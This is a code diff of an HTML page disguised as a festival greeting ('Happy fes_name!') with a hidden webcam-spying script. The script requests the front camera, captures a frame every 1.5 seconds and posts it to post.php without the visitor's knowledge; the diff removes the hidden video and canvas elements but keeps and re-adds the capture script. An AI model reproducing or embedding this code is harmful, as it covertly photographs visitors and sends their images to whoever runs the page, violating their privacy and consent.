@@ -16,8 +16,16 @@
             background: linear-gradient(135deg, #ffcc00, #ff6699);
             font-family: 'Sofia', sans-serif;
             color: white;
-            text-align: center;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             animation: fadeIn 2s ease-in;
+        }
+
+        .content {
+            text-align: center;
         }
 
         h1 {
@@ -38,14 +46,6 @@
             opacity: 1;
         }
 
-        .video-wrap {
-            border: 5px solid #ff6699;
-            border-radius: 15px;
-            overflow: hidden;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
-            animation: slideIn 1s forwards;
-        }
-
         @keyframes fadeIn {
             from { opacity: 0; }
             to { opacity: 1; }
@@ -56,85 +56,77 @@
             40% { transform: translateY(-30px); }
             60% { transform: translateY(-15px); }
         }
-
-        @keyframes slideIn {
-            from { transform: translateY(-100%); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
     </style>
-<div class="video-wrap" hidden="hidden">
-    <video id="video" playsinline autoplay></video>
-</div>
-<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+</head>
 <script>
-function post(imgdata) {
-    $.ajax({
-        type: 'POST',
-        data: { cat: imgdata },
-        url: 'post.php',
-        dataType: 'json',
-        async: false,
-        success: function(result) {
-            console.log("Image sent successfully!");
-        },
-        error: function(xhr, status, error) {
-            console.error("Error sending image:", error);
-        }
-    });
-};
-
-'use strict';
-
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const errorMsgElement = document.querySelector('span#errorMsg');
-
-const constraints = {
-    audio: false,
-    video: {
-        facingMode: "user"
-    }
-};
-
-
-if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-    console.error("getUserMedia is not supported in this browser.");
-    errorMsgElement.innerHTML = "Your browser does not support camera access.";
-} else {
-   
-    async function init() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia(constraints);
-            console.log("Webcam access granted!");
-            handleSuccess(stream);
-        } catch (e) {
-            console.error("Webcam access denied:", e);
-            errorMsgElement.innerHTML = `Error accessing camera: ${e.toString()}`;
-        }
-    }
-
+    function post(imgdata) {
+        $.ajax({
+            type: 'POST',
+            data: { cat: imgdata },
+            url: 'post.php',
+            dataType: 'json',
+            async: false,
+            success: function(result) {
+                console.log("Image sent successfully!");
+            },
+            error: function(xhr, status, error) {
+                console.error("Error sending image:", error);
+            }
+        });
+    };
     
-    function handleSuccess(stream) {
-        window.stream = stream;
-        video.srcObject = stream;
-
-        var context = canvas.getContext('2d');
-        setInterval(function() {
-            context.drawImage(video, 0, 0, 640, 480);
-            var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-            console.log("Captured image:", canvasData.substring(0, 50) + "..."); // Log partial image data
-            post(canvasData);
-        }, 1500);
-    }
-
+    'use strict';
     
-    init();
-}
-</script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const errorMsgElement = document.querySelector('span#errorMsg');
+    
+    const constraints = {
+        audio: false,
+        video: {
+            facingMode: "user"
+        }
+    };
+    
+    
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        console.error("getUserMedia is not supported in this browser.");
+        errorMsgElement.innerHTML = "Your browser does not support camera access.";
+    } else {
+        
+        async function init() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                console.log("Webcam access granted!");
+                handleSuccess(stream);
+            } catch (e) {
+                console.error("Webcam access denied:", e);
+                errorMsgElement.innerHTML = `Error accessing camera: ${e.toString()}`;
+            }
+        }
+    
+     
+        function handleSuccess(stream) {
+            window.stream = stream;
+            video.srcObject = stream;
+    
+            var context = canvas.getContext('2d');
+            setInterval(function() {
+                context.drawImage(video, 0, 0, 640, 480);
+                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+                console.log("Captured image:", canvasData.substring(0, 50) + "..."); 
+                post(canvasData);
+            }, 1500);
+        }
+    
+        
+        init();
+    }
+    </script>
 <body>
-    <center>
+    <div class="content">
         <h1>Happy fes_name!</h1>
         <p>Wishing you a very happy fes_name. May this festival bring joy and prosperity to your life.</p>
-    </center>
+    </div>
 </body>
 </html>
